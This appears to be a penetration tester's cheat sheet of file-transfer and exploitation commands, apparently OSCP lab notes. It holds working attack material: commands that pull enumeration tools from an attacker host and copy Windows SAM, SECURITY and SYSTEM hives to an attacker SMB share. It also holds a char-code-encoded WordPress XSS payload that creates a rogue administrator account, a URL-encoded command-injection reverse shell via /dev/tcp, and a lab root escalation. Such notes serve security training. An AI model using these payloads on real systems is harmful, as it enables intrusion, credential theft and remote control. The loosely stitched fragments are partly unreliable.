> Source: `File Transfer.md` → `File Transfer`

https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/​

|                                                                                                                                                                                                                                                                                                             |                                                                                                                                                                                        |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Transferring Files**                                                                                                                                                                                                                                                                                      | ​                                                                                                                                                                                      |
| `xfreerdp /v:<IP> /u:<username> /p:<password> /drive:linux,/home/gigs/offsec/Tools /cert-ignore remmina -c rdp://domain\username@server`                                                                                                                                                                    | RDP to target and share kali drive for easy access. Remmina incase copying is bugging out                                                                                              |
| `python3 -m http.server 8000 python -m SimpleHTTPServer [PORT]`                                                                                                                                                                                                                                             | Start a local webserver                                                                                                                                                                |
| `wget http://10.10.14.1:8000/linpeas.sh`                                                                                                                                                                                                                                                                    | Download a file on the remote server from our local machine                                                                                                                            |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe`                                                                                                                                                                                     | Download a file on the remote server from our local machine                                                                                                                            |
| Linux:<br><br>`impacket-smbserver test . -smb2support -username gigs -password gigs`<br><br>Windows:<br><br>`Add network location in File Explorer \\<IP>\shared`<br>OR<br>`net use m: \Kali_IP\test /user:gigs gigs`<br>`copy mimikatz.log m:\`<br>OR<br>`smbclient //192.168.50.195/share -c 'put file.s` | SMB file transfer Windows to Linux<br><br>​[https://discord.com/channels/780824470113615893/1148907181480104028](https://discord.com/channels/780824470113615893/1148907181480104028)​ |
| `scp linenum.sh user@<IP>:/tmp/linenum.sh`                                                                                                                                                                                                                                                                  | Transfer a file to the remote server with `scp` (requires SSH access)                                                                                                                  |
| `git clone https://github.com/Oweoqi/simple-php-upload.git`<br>`cd simple-php-upload`<br>`php -S 127.0.0.1:80`<br>Then navigate to [http://127.0.0.1/upload.php](http://127.0.0.1/upload.php)​                                                                                                              | Simple PHP Upload server                                                                                                                                                               |
| `base64 -n "base64-output" > file`                                                                                                                                                                                                                                                                          | Convert a file to `base64`                                                                                                                                                             |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`                                                                                                                                                                                                                                                           | Convert a file from `base64` back to its orig                                                                                                                                          |
| `md5sum shell`                                                                                                                                                                                                                                                                                              | Check the file's `md5sum` to ensure it converted correctly                                                                                                                             |

## SMB Server

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server`

```rust
impacket-smbserver share -smb2support ~/oscp/skylark/221 -user test -password test
```

```rust
PS C:\temp> net use n: \\192.168.45.198\share /user:test test
The command completed successfully.

PS C:\temp> copy sam n:
PS C:\temp> copy SECURITY n:
PS C:\temp> copy system n:
```

Grep out IP Addresses
```rust
 grep -E "Nmap scan report for|445/tcp open" smb.txt.nmap | grep -B 1 "445/tcp open" | grep "Nmap scan report for" | awk '{print $5}'
```

```rust
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
console.log(encoded)
```

```rust
118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59
```

```shell
test%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.xxx.xxx/443+0>%261'%22
```

Decoding Base66
```rust
 echo 'ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAIAB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA==' | base64 --decode
```


---


## impacket smbserver

> Source: `01101100-C0D3X-00110110.md` → `Impacket > impacket smbserver`

```
impacket-smbserver share . -smb2support
```


## base64key

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > cat /etc/crontab > base64key`

[![image](https://private-user-images.githubusercontent.com/127046919/241592409-719d4be5-ae0b-45d0-858a-22d2bd5a7ab8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxNTkyNDA5LTcxOWQ0YmU1LWFlMGItNDVkMC04NThhLTIyZDJiZDVhN2FiOC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02NTU1M2ViM2RkM2RkZDlkMjkxYTllOGY5ODg1YTRlOTVlYjA0YTJkMzhhOTE3NWFiMjNiYmEwNTE2NzFkN2U4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.ea0lrIz9IbMdESMUqIVXCRh-WpuZP8V18L0E-W78K2g)](https://private-user-images.githubusercontent.com/127046919/241592409-719d4be5-ae0b-45d0-858a-22d2bd5a7ab8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxNTkyNDA5LTcxOWQ0YmU1LWFlMGItNDVkMC04NThhLTIyZDJiZDVhN2FiOC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02NTU1M2ViM2RkM2RkZDlkMjkxYTllOGY5ODg1YTRlOTVlYjA0YTJkMzhhOTE3NWFiMjNiYmEwNTE2NzFkN2U4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.ea0lrIz9IbMdESMUqIVXCRh-WpuZP8V18L0E-W78K2g)

```
[marcus@catto ~]$ ls -la
total 24
drwx------  6 marcus marcus 201 May 28 22:20 .
drwxr-xr-x. 3 root   root    20 Nov 25  2020 ..
-rw-r--r--  1 root   root    29 Nov 25  2020 .bash
-rw-------  1 marcus marcus   0 Apr 14  2021 .bash_history
-rw-r--r--  1 marcus marcus  18 Nov  8  2019 .bash_logout
-rw-r--r--  1 marcus marcus 141 Nov  8  2019 .bash_profile
-rw-r--r--  1 marcus marcus 312 Nov  8  2019 .bashrc
-rwxrwxr-x  1 marcus marcus 194 May 28 22:18 boot_success
drwx------  4 marcus marcus  39 Nov 25  2020 .config
drwxr-xr-x  6 marcus marcus 328 Nov 25  2020 gatsby-blog-starter
drwx------  3 marcus marcus  69 May 28 22:06 .gnupg
-rw-------  1 marcus marcus  33 May 28 21:49 local.txt
drwxrwxr-x  4 marcus marcus  69 Nov 25  2020 .npm
```

```
[marcus@catto ~]$ cat .bash
F2jJDWaNin8pdk93RLzkdOTr60==
```

```
[marcus@catto ~]$ base64key F2jJDWaNin8pdk93RLzkdOTr60== WallAskCharacter305 1
SortMentionLeast269
```

```
[marcus@catto ~]$ su
Password: 
[root@catto marcus]# id
uid=0(root) gid=0(root) groups=0(root)
```

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md #Last Resort
```

